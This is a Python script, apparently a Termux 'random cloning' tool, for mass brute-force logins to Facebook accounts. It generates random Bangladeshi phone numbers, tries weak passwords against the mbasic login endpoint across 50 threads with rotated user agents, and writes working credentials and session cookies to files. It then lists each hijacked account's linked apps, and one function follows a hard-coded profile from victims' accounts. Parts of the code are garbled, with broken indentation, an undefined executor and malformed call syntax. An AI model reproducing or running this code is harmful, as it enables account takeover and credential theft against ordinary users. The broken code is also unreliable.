# Facebook: Tutul King
# Github: Tutul-King
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌐] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌐] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100077855090738/')
logo =("""
  \033[1;92m███████ ███████ ███    ██  █████  ██    ██ ███████ ██
  \033[1;92m██      ██      ████   ██ ██   ██  ██  ██  ██      ██      
  \033[1;92m███████ █████   ██ ██  ██ ███████   ████   █████   ██      
  \033[1;92m     ██ ██      ██  ██ ██ ██   ██    ██    ██      ██      
  \033[1;92m███████ ███████ ██   ████ ██   ██    ██    ███████ ███████ 
         
 \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mSENAYEL ISLAM (DIP)   \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m SENAYE ISLAM		 \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mMAGIC-DIP..           \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning BD     \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mKGF                   \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36mMAX                   \033[1;93m|
 \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m DIP TERMUX HELPING ZONE....
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××
    """) 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0.10586.713; osmeta 8.3.47029472) AppleWebKit/602.1.1 (KHTML, like Gecko) Version/9.0 Safari/602.1.1 osmeta/8.3.47029472 Build/47029472 [FBAN/FBW;FBAV/75.0.0.50.22;FBBV/47052341;FBRV/0;FBDV/WindowsDevice;FBMD/Aspire one 1-431;FBSN/Windows;FBSV/10.0.10586.753;FBSS/1;FBCR/;FBID/desktop;FBLC/en_GB;FBOP/45]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m] Example>: /033[1;96m019, /033[1;92m017, /033[1;94m018, /033[1;93m92302, /033[1;91m92301, /033[1;93m91778{x}')
    print("  \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '017'
    code = random.choice([rk1,rk2,rk3])                      # input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000  \n \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f" \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')
        jalan(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m YOUR TOTAL IDS \033[1;97m: {xr}'+tl)
        jalan(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
        jalan(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m USE \033[1;97m: \033[1;96mDATA + WIFI ')
        jalan(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m NETWORK \033[1;97m: \033[1;96m2G, 3G, 4G, 5G')
        jalan(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m GITHUB \033[1;97m: \033[1;96mMAGIC-DIP')
        jalan(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m 70% OK ID LOG IN')
        jalan(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m USE AIRPLANE MODE ON/OFF 5 MIN ')
        jalan(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(' \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××')
        for guru in user:
		    pwx = [guru, 'bangladesh','Bangladesh','i love you','I Love You',]
		    yaari.submit(rcrack,uid,pwx,tl)
    print(51*'×')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            agents = ['Mozilla/5.0 (Linux; Android 10; SM-T970) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5361.170 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5369.218 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5383.200 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5378.146 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5363.208 Safari/537.36', 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5365.116 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5387.128 Safari/537.36', 'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5407.114 Safari/537.36', 'Mozilla/5.0 (Android 9.1; Tablet; rv:111.0) Gecko/111.0 Firefox/111.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5397.123 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/553.30.4 (KHTML, like Gecko) Version/12.7.73 Mobile/CU4EC5 Safari/553.30.4', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5411.174 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; MRX-AL09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5392.190 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Lenovo TB-X505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5395.168 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.0 Mobile/YVRJP4 Safari/591.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5392.162 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5414.117 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; e-tab 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5410.189 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5379.129 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5378.144 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/556.32 (KHTML, like Gecko) Version/10.1.26 Mobile/NYLQTT Safari/556.32', 'Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5405.177 Safari/537.36', 'Mozilla/5.0 (Android; Mobile; rv:115.0esr) Gecko/115.0esr Firefox/115.0esr', 'Mozilla/5.0 (Linux; Android 11; SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5386.196 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/549.33 (KHTML, like Gecko) Version/10.3.91 Mobile/RKW4S3 Safari/549.33', 'Mozilla/5.0 (Linux; Android 10; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5406.176 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 11.0; WOW64; x64; rv:118.0esr) Gecko/20110101 Firefox/118.0esr', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/600.8.12 (KHTML, like Gecko) Version/10.5 Mobile/8E2E9F Safari/570.22', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/600.5.16 (KHTML, like Gecko) Version/13.6 Mobile/E8JNHT Safari/538.2', 'Mozilla/5.0 (Linux; Android 11; Lenovo YT-X705L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5396.208 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; 100003562) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5388.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5388.197 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Lenovo TB-J606F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5374.156 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/600.3.22 (KHTML, like Gecko) Version/12.4.86 Mobile/Q82FE6 Safari/575.16.13', 'Mozilla/5.0 (Linux; Android 10; P20HD_ROW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.169 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-T720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5412.130 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/600.2.23 (KHTML, like Gecko) Version/12.5 Mobile/GJDHQO Safari/600.32', 'Mozilla/5.0 (Linux; Android 10; Lenovo YT-X705X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5413.178 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5397.145 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; Lenovo TB-X605LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5406.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5390.166 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; P20HD_ROW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5372.155 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5411.212 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; 100015685-A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5384.185 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-T507) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5398.99 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/593.9 (KHTML, like Gecko) Version/10.3 Mobile/ZQS02F Safari/593.9', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/553.22.4 (KHTML, like Gecko) Version/14.4.36 Mobile/5J45ER Safari/553.22.4', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/544.22 (KHTML, like Gecko) Version/12.7 Mobile/P7HY7F Safari/544.22', 'Mozilla/5.0 (Linux; Android 9; P20HD_ROW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5377.186 Mobile Safari/537.36', 'Mozilla/5.0 (Android; Tablet; rv:110.0) Gecko/110.0 Firefox/110.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/13.5.67 Mobile/W91BTR Safari/581.23.4', 'Mozilla/5.0 (Linux; Android 10; SM-T505N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5401.214 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; J5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5367.160 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5363.102 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; SCM-W09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5375.177 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1 like Mac OS X) AppleWebKit/560.24 (KHTML, like Gecko) Version/12.2 Mobile/UTTVFN Safari/560.24', 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/11.4 Mobile/413MYL Safari/538.16', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5400.175 Safari/537', 'Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5411.137 Safari/537.36', 'Mozilla/5.0 (Windows NT 11.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5386.135 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5409.97 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20170909 Firefox/114.0', 'Mozilla/5.0 (Linux; Android 11; 100015685-A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5396.113 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5386.109 Mobile Safari/537.36']
			session = requests.Session()
			sys.stdout.write(' \r \33[1;92m[HASAN-%s] \33[1;92m[OK:\33[1;92m%s\33[1;92m]'%(loop,len(oks))),
			sys.stdout.flush()
			pro = random.choice(agents)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
			'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=5pK-Yy7UNacH3NUrKht_YPrO; sb=5pK-Y0b1ZMQ2H4KyjfKqVnrJ; wd=461x834; fr=0vcQXYk6gxd5CDEhC..BjvtWw.2s.AAA.0.0.Bjv8h-.AWWeMw5mIXE',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[SENAYEL-OK🍼] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/SENAYEL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[SENAYEL-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/SENAYEL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}SENAYEL{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()
